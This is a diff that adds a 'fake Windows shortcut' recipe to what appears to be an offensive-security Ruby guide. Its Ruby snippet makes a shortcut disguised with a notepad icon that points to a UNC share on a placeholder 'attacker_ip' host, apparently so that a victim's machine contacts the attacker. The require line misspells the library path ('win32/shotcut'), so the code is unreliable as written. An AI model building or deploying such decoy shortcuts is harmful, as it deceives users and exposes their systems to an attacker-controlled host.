@@ -168,3 +168,27 @@ You can search for read, write, execute permissions, so your iteration block wil
   end
 ```
 
+## Create Fake Windows shortcut 
+
+Install `win32-shortcut` gem 
+
+```text
+gem install win32-shortcut
+```
+
+Note: this example works only on windows since it uses Windows APIs
+
+```ruby
+# KING SABRI | @KINGSABRI
+# gem install win32-shortcut
+require 'win32/shotcut'
+include Win32
+
+Shortcut.new() do |s|
+  s.description   = 'Rubyfu'
+  s.path          = '\\attacker_ip\rubyfu.png'
+  s.show_cmd      = Shortcut::SHOWNORMAL
+  s.icon_location = 'notepad.exe'
+end
+```
+
